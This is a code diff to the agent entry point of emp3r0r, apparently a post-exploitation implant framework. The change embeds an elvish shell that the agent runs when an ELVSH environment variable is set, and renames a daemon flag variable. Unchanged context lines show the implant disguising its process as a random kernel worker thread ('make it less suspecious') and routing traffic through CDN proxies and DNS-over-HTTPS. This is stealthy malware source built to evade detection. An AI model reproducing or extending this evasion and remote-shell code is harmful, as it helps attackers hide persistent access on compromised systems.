@@ -24,6 +24,11 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
 	"github.com/ncruces/go-dns"
+	"src.elv.sh/pkg/buildinfo"
+	"src.elv.sh/pkg/daemon"
+	"src.elv.sh/pkg/lsp"
+	"src.elv.sh/pkg/prog"
+	"src.elv.sh/pkg/shell"
 )
 
 func main() {
@@ -34,14 +39,25 @@ func main() {
 	doh := flag.String("doh", "", "DNS over HTTPS server for CDN proxy's DNS requests")
 	replace := flag.Bool("replace", false, "Replace existing agent process")
 	silent := flag.Bool("silent", false, "Suppress output")
-	daemon := flag.Bool("daemon", false, "Daemonize")
+	runasdaemon := flag.Bool("daemon", false, "Daemonize")
 	version := flag.Bool("version", false, "Show version info")
 	flag.Parse()
 
 	// rename our agent process to make it less suspecious
+	osArgs := os.Args
 	agent.SetProcessName(fmt.Sprintf("[kworker/%d:%d-events]",
 		util.RandInt(1, 20),
 		util.RandInt(0, 6)))
+
+	// run as elvish shell
+	runElvsh := os.Getenv("ELVSH") == "TRUE"
+	if runElvsh {
+		os.Exit(prog.Run(
+			[3]*os.File{os.Stdin, os.Stdout, os.Stderr}, osArgs,
+			prog.Composite(
+				&buildinfo.Program{}, &daemon.Program{}, &lsp.Program{},
+				&shell.Program{ActivateDaemon: daemon.Activate})))
+	}
 
 	// applyRuntimeConfig
 	err = agent.ApplyRuntimeConfig()
@@ -113,7 +129,7 @@ func main() {
 	}
 
 	// daemonize
-	if *daemon {
+	if *runasdaemon {
 		args := os.Args[1:]
 		i := 0
 		for ; i < len(args); i++ {
